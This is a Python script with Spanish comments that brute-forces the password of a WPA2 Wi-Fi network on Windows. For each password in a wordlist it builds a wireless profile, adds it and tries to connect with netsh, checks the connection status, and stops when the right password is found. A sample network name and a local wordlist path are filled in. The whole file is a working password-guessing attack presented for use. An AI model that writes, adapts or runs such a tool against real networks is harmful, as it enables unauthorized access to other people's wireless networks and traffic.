import subprocess
import time
import os

def connect_to_wifi_with_passwords(network_name, password_file):
    """
    Realiza un ataque de fuerza bruta probando varias contraseñas para una red Wi-Fi específica.  por  un documeto txt"""
    try:
        # Leer todas las contraseñas desde el archivo
        with open(password_file, 'r') as file:
            passwords = file.readlines()

        for password in passwords:
            password = password.strip()

            # Validar la longitud de la contraseña
            if not (8 <= len(password) <= 63):
                print(f"[-] Contraseña inválida (longitud incorrecta): {password}")
                continue

            print(f"[+] Probando contraseña en {network_name}: {password}")

            # Crear el perfil XML para la red Wi-Fi # esta parte la copie por para no dejar 
            profile_template = f"""
            <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
                <name>{network_name}</name>
                <SSIDConfig>
                    <SSID>
                        <name>{network_name}</name>
                    </SSID>
                </SSIDConfig>
                <connectionType>ESS</connectionType>
                <connectionMode>manual</connectionMode>
                <MSM>
                    <security>
                        <authEncryption>
                            <authentication>WPA2PSK</authentication>
                            <encryption>AES</encryption>
                            <useOneX>false</useOneX>
                        </authEncryption>
                        <sharedKey>
                            <keyType>passPhrase</keyType>
                            <protected>false</protected>
                            <keyMaterial>{password}</keyMaterial>
                        </sharedKey>
                    </security>
                </MSM>
            </WLANProfile>
            """

            # Guardar el perfil temporalmente en un archivo XML
            profile_path = f"{network_name}.xml"
            with open(profile_path, 'w') as profile_file:
                profile_file.write(profile_template)

            # Agregar el perfil de red
            try:
                subprocess.run(['netsh', 'wlan', 'add', 'profile', f'filename={profile_path}'], check=True)

                # Intentar conectarse a la red
                connect_result = subprocess.run(['netsh', 'wlan', 'connect', f'name={network_name}'],
                                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                # Esperar unos segundos para que la conexión se establezca
                time.sleep(5)

                # Verificar el estado de la conexión
                interfaces_result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], stdout=subprocess.PIPE, text=True)
                if "Estado                  : conectado" in interfaces_result.stdout and network_name in interfaces_result.stdout:
                    print(f"[+] Conexión exitosa a {network_name} con la contraseña: {password}")
                    break  # Detener el proceso si la conexión es exitosa
                else:
                    print(f"[-] Contraseña incorrecta: {password}")
            except subprocess.CalledProcessError as e:
                print(f"[-] Error al agregar o conectar con el perfil: {e}")
            finally:
                # Eliminar el perfil temporal
                if os.path.exists(profile_path):
                    os.remove(profile_path)

    except FileNotFoundError:
        print(f"[-] No se encontró el archivo {password_file}.")
    except Exception as e:
        print(f"Error: {e}")

# Ejemplo de uso
network_name = "motog31"  # Reemplaza con el nombre de tu red
password_file = "C:\\Users\\saulm\\Downloads\\contrasenas_pequenas.txt"  # Reemplaza con la ruta de tu archivo
connect_to_wifi_with_passwords(network_name, password_file)
